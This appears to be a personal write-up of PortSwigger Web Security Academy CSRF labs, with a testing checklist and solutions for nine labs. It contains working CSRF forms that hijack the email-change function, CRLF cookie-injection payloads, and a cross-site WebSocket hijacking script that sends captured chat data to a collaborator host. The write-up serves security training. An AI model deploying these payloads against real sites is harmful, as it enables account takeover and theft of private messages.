## Approach

1. If there's OAuth:
	- Check for `state` param, if no `state` then try [CSRF](#[1.%20Forced%20OAuth%20profile%20linking](https%20//portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking))
	- Check if `session` cookie has [`SameSite` flag set or not](#[9.%20SameSite%20Lax%20bypass%20via%20cookie%20refresh](https%20//portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh))
2. No CSRF token for sensitive operation like **change email** or **refresh password**, definitely test it
	- If it validates via `Referer` header, check out:
		- [Lab 2](#[2.%20CSRF%20with%20broken%20Referer%20validation](https%20//portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken))  - `Referer: https://[EXPLOIT_SERVER]/?x=[LAB_URL]`
		- [Lab 3](#[3.%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present](https%20//portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)) - Removing `Referer` header entirely
	- Watch out for cookie's tied to validating CSRF token:
		- [Lab 4](#[4.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie](https%20//portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)) - `csrfKey` cookie and CSRF token for validation with **arbitrary Set-Cookie possible**
		- [Lab 5](#[5.%20CSRF%20where%20token%20is%20duplicated%20in%20cookie](https%20//portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)) - CSRF token also in cookie as validation with **arbitrary Set-Cookie possible**
3. Check if there's any feature using **WebSocket** like **live chat**, refer to [this](#[8.%20SameSite%20Strict%20bypass%20via%20sibling%20domain](https%20//portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain))
4. A tip is to use ***Burp Generate CSRF PoC***
## Labs
### [1. Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

> [!NOTE] 
> No `state` param during OAuth process allows CSRF to be done, this case it's done on social linking, attaching our social account to a victim's account 

> **State** param is not used allowing CSRF attack on social linking feature
![](attachments/Pasted%20image%2020260104064948.png)

> Generating CSRF PoC from the previously generated auth token,
> **Host** the PoC on the **exploit server** and **Deliver the exploit to victim**
> Note: **Don't send the request yourself, it will use up the code**
![](attachments/Pasted%20image%2020260104065237.png)

>After delivering the exploit, our social account will be linked to the victim's account
![](attachments/Pasted%20image%2020260104070508.png)
### [2. CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

> [!NOTE] 
> Doesn't use `csrf` token but uses the `Referer` header for validation by checking if it's coming from the vulnerable website itself. This can be bypassed by adding the vulnerable website URL to our exploit server URL 

**Response head**

> `Referrer-Policy: unsafe-url` is needed to tell browser to include full URL
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

**Response body**

> - Append lab URL via `pushState()` to the end of our exploit server URL as a query string
> - The point is to fool the vulnerable website thinking the request is coming from itself
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?x=[LAB_URL]');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### [3. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

> [!NOTE] 
> Website validates CSRF via `Referer` header but removing it removes the validation allowing CSRF

**Response head**

> `Referrer-Policy: no-referrer` is needed to tell browser to not use the `Referer` header
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: no-referrer

```

**Response body**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### [4. CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

> [!NOTE] 
> Token is tied with **non-session cookie** here it's `csrfKey` cookie, with a paired set any request is considered valid even CSRF. This is vulnerable if attacker is able to set victim's `csrfkey`

> - Here we have a functionality where the search request is able to set a cookie when escaped we can set arbitrary cookies
> - Using CRLF `\r\n` URL encoded `%0D%0A`  to escape `Set-Cookie: LastSearchTerm` 
> - When setting `csrfKey` cookie use `SameSite=None`, this is important because in default setting `Lax` browser won't set the cookie especially if it's not a **top level navigation** like visiting the direct URL. 
![](attachments/Pasted%20image%2020260104140532.png)

**Response body**

> We'll be setting the cookie through a background request via `<img>` tag, if we didn't specify to use `SameSite=None` this will not work because it's not a **top level navigation**
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="hidden" name="csrf" value="[CSRF_TOKEN]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
    <img src="https://[LAB_URL]/?search=asd;%0D%0ASet-Cookie:%20csrfKey=[CSRFKEY_COOKIE]; SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

### [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

> [!NOTE] 
> Similar to [Lab 4](#[4.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie](https%20//portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)), the CSRF validation is based on a paired CSRF token and a cookie but this time, it's just the CSRF token itself contained in the cookie, only needing a valid pair and then CSRF is possible

> Same as [before](#[4.%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie](https%20//portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)) search functionality allows us to set an arbitrary cookie
![](attachments/Pasted%20image%2020260104151929.png)

**Response body**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="hidden" name="csrf" value="[CSRF_TOKEN]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
    <img src="https://[LAB_URL]/?search=asd;%0D%0ASet-Cookie: csrf=[CSRF_TOKEN]; SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

### [6. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

> [!NOTE] 
> Validation only happens if there's CSRF token, if we remove it no validation allowing CSRF

**Response body**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### [7. CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

> [!NOTE] 
> No defense.

**Response body**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="[foo&#64;example.com]" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### [8. SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

> [!NOTE] 
> - Pretty hard lab, since the cookie is `SameSite=Strict` we need to find a domain related to our target website, in this one we did `cms-0a9f003504398aa480ea039c002500ca.web-security-academy.net`
> - Another thing is since we need to attack main domain from the sibling domain, we need to find a vuln there, in this case it's an RXSS but it's still not done yet
> - We need to find a vulnerable vector, this the **live chat** feature why? there's no a type of unpredictable token like a CSRF token allowing CSWSH

> Doing some recon to find sibling domain
![](attachments/Pasted%20image%2020260104154807.png)

**RXSS in sibling domain**

![](attachments/Pasted%20image%2020260104154925.png)

> Confirming WebSocket is vulnerable to CSWSH because no unpredictable token
![](attachments/Pasted%20image%2020260104162640.png)

**CSWSH payload**

> - This is for checking if you're able to capture chat data
> - `ws.send("READY")` tells the server, we're ready to be sent data, this can be seen also when using live chat
![](attachments/Pasted%20image%2020260104155748.png)

> `ws.onmessage` is a listener for capturing data when the server response to our "READY" message, it will be dumped to our ***Burp Collaborator***
```js
<script>
    var ws = new WebSocket('wss://[LAB_URL]/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://[BURP_COLLABORATOR]', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

**CSRF payload**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[SIBLING_DOMAIN]/login" method="POST">
      <input type="hidden" name="username" value="[CSWSH_PAYLOAD]" />
      <input type="hidden" name="password" value="a" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![](attachments/Pasted%20image%2020260104160544.png)
### [9. SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)

> [!NOTE] 
> In special cases like OAuth logins, there's a quirk where cookies that is not set `SameSite` flag is vulnerable to **cross-site** attacks due to there being a 2 min window of it not being set automatically to `SameSite=Lax` allowing our CSRF

> The final OAuth request for cookie generation shows no `SameSite` flag being set
![](attachments/Pasted%20image%2020260104164836.png)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://[LAB_URL]/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="d&#64;a" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```